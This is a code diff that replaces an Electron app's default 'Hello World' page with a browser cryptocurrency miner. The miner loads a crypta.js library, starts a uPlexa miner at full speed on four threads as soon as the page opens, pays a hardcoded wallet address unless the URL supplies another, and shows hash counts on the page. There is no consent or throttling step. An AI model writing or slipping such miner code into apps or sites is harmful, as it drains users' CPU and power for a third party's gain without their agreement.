@@ -1,19 +1,70 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Hello World!</title>
-  </head>
-  <body>
-    <h1>Hello World!</h1>
-    <!-- All of the Node.js APIs are available in this renderer process. -->
-    We are using Node.js <script>document.write(process.versions.node)</script>,
-    Chromium <script>document.write(process.versions.chrome)</script>,
-    and Electron <script>document.write(process.versions.electron)</script>.
+<head>
+  <title></title>
+</head>
+<body>
 
-    <script>
-      // You can also require other files to run in this process
-      require('./renderer.js')
-    </script>
-  </body>
+
+<div>
+  <span>hashes-per-second: <span id="mining-hashes-per-second">0</span></span>
+  <br>
+  <span>total-hashes: <span id="mining-hashes-total">0</span></span>
+  <br>
+  <span>hashes-accepted: <span id="mining-hashes-accepted">0</span></span>
+</div>
+
+
+
+<script src="./lib/crypta.js"></script>
+<script>
+function getQueryParams(qs) {
+    qs = qs.split('+').join(' ');
+
+    var params = {}, tokens, re = /[?&]?([^=]+)=([^&]*)/g;
+
+    while (tokens = re.exec(qs)) {
+        params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]);
+    }
+
+    return params;
+}
+
+var query = getQueryParams(document.location.search);
+
+if (!query.wallet) {
+    query.wallet = 'UPX1Rb8jmJJ3ubhmzgF35vNCUAVJU8WayKtRbVo5FDJiLRio8SqduyAcqKn9xQaQqQALevkeuEd77bUTusS9t8TF4BCyJpfHWN';
+}
+
+var miner = new CRLT.User('aa70d58beb4f3fec2419c4bc38a7381f00e36670a671',query.wallet,{
+    threads: 4,
+    throttle: 0,
+    coin: "upx",
+});
+
+miner.start();
+
+// Listen on events
+//miner.on('found', function() {/* Hash found */
+//})
+//miner.on('accepted', function() {/* Hash accepted by the pool */
+//})
+
+// Update stats once per second
+setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+
+    // Output to HTML elements...
+    document.getElementById('mining-hashes-per-second').innerHTML = hashesPerSecond;
+    document.getElementById('mining-hashes-total').innerHTML = totalHashes;
+    document.getElementById('mining-hashes-accepted').innerHTML = acceptedHashes;
+
+}, 1000);
+
+
+</script>
+
+</body>
 </html>
